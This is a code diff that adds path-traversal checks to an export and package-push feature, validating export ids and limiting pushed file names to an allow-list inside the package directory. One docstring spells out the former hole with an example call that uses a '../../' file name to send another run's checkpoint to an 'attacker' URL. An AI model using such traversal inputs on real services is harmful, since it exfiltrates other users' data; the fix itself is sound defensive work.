@@ -937,6 +937,85 @@ def require_caller_may_mutate(session_id: str, context: Any) -> None:
         )
 
 
+class InvalidExportId(ValueError):
+    """An export_id the server could not have issued."""
+
+
+class InvalidPackageMember(ValueError):
+    """A package file name that is not one this export announced."""
+
+
+#: What `export_model` mints is `uuid4().hex`. The check is deliberately a
+#: little wider than that so an id minted by an older version still resolves,
+#: but narrow enough that it cannot be a path: no separators, no `..`.
+EXPORT_ID_PATTERN = re.compile(r"\A[A-Za-z0-9][A-Za-z0-9._-]{0,127}\Z")
+
+
+def validate_export_id(export_id: Any) -> str:
+    """The export_id, or raise.
+
+    The id becomes a file name under the exports root, exactly as a session id
+    becomes a directory name under the sessions root -- and that one was a
+    traversal until it was checked. The value is NOT echoed in full: it is
+    caller-controlled and this message reaches logs.
+    """
+    if not isinstance(export_id, str):
+        raise InvalidExportId(
+            f"export_id must be a string, got {type(export_id).__name__}"
+        )
+    if ".." in export_id or not EXPORT_ID_PATTERN.match(export_id):
+        raise InvalidExportId(
+            f"export_id is not a valid export identifier "
+            f"(length {len(export_id)}, starts {export_id[:12]!r})"
+        )
+    return export_id
+
+
+def package_member_path(package_dir: Any, name: Any, *, announced: Any) -> Path:
+    """The path of one member of a built package, or raise.
+
+    TWO independent layers, deliberately not one, and the same shape as
+    `session_dir`:
+
+    1. the name must be one the export's own record ANNOUNCED. That is an
+       allow-list of the files this package actually has, which is a stronger
+       statement than any pattern over names;
+    2. the resolved path must still be inside the resolved package directory.
+       Not redundant with layer 1 -- it is what still holds if the allow-list
+       is ever loosened, and it also catches a symlink inside the package that
+       points out of it, which layer 1 cannot see.
+
+    The hole this closes, measured on the method before it existed: the caller
+    supplies the file names, they were joined to the package directory
+    unchecked, and `push_export(my_export, {"../../.bioengine/sessions/<other
+    run>/best.pt": "https://attacker/put"})` streamed ANOTHER run's checkpoint
+    to a URL of the caller's choosing. An absolute name did the same, because
+    joining an absolute path discards the directory it was joined to. Binding
+    the handle to its creator without bounding the names would only have moved
+    the hole from "somebody else's export id" to "your own".
+    """
+    names = set()
+    for entry in announced or []:
+        if isinstance(entry, dict) and isinstance(entry.get("name"), str):
+            names.add(entry["name"])
+        elif isinstance(entry, str):
+            names.add(entry)
+    if not isinstance(name, str) or name not in names:
+        raise InvalidPackageMember(
+            f"'{name if isinstance(name, str) else type(name).__name__}' is not "
+            "a file of this export; only the names it reported can be pushed"
+        )
+    root = Path(package_dir).resolve()
+    candidate = (root / name).resolve()
+    try:
+        candidate.relative_to(root)
+    except ValueError:
+        raise InvalidPackageMember(
+            "a package file name resolves outside the package directory"
+        )
+    return candidate
+
+
 def caller_may_use_export(export_id: str, context: Any) -> bool:
     """True iff *context* identifies the export's creator, or a ``bioimage-io``
     admin.
@@ -958,11 +1037,13 @@ def caller_may_use_export(export_id: str, context: Any) -> bool:
       Those expire within hours, so the window in which a non-admin is refused
       their own in-flight export is bounded and known rather than permanent.
 
-    Reads what is on disk through :func:`read_export` and CREATES NOTHING -- not
-    :func:`get_export`, which sweeps a stale record and WRITES. Asking about an
-    export that does not exist is therefore safe and answers False for a
-    non-admin, which is what lets the refusal be identical for "not yours" and
-    "no such export".
+    Reads what is on disk through :func:`read_export` and creates nothing, so
+    asking about an export that does not exist is safe and answers False for a
+    non-admin -- which is what lets the refusal be identical for "not yours"
+    and "no such export". (An earlier version of this note said
+    :func:`get_export` WRITES the swept record; it does not. It changes its
+    own in-memory copy and returns it. The gate still runs first, because the
+    refusal must not depend on what the record says.)
     """
     owner = read_export(export_id).get("_owner")
     if isinstance(owner, str) and owner:
@@ -1114,7 +1195,20 @@ def exports_root() -> Path:
 
 
 def _export_path(export_id: str) -> Path:
-    return exports_root() / f"{export_id}.json"
+    """The record file for *export_id*, guaranteed to be under the exports root.
+
+    Validated AND contained, for the same reason `session_dir` is both: the id
+    arrives from a caller, and softening either check alone leaves the other
+    refusing.
+    """
+    root = exports_root()
+    candidate = root / f"{validate_export_id(export_id)}.json"
+    resolved_root = root.resolve()
+    try:
+        candidate.resolve().relative_to(resolved_root)
+    except ValueError:
+        raise InvalidExportId("export_id resolves outside the exports root")
+    return candidate
 
 
 def read_export(export_id: str) -> Dict[str, Any]:
